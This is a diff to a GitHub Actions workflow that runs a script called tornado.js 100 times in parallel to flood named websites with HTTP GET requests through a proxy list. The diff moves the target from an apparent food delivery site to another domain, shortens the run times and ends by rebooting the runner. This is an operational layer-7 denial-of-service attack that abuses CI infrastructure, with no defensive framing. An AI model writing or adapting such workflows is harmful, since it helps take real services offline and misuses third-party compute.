@@ -1,4 +1,4 @@
-name: Ubuntu VDS 50 saniye tornad
+  name: Ubuntu VDS 50 saniye tornad
 
 on:
   workflow_dispatch:
@@ -21,7 +21,7 @@ jobs:
           chmod +x tornado.js
           PIDS=()
           for i in {1..100}; do
-            timeout 185 node tornado.js GET https://tgoyemek.com/ 180 32 90 fres.txt --full --query 3
+            timeout 75 node tornado.js GET https://l7waf.com/ 70 32 90 fres.txt --full --query 3
             PIDS+=($!)
           done
           
@@ -30,7 +30,7 @@ jobs:
           done
 
       - name: OK !
-        run: sleep 185
+        run: sleep 75
         
       - name: OK !
         run: sudo reboot
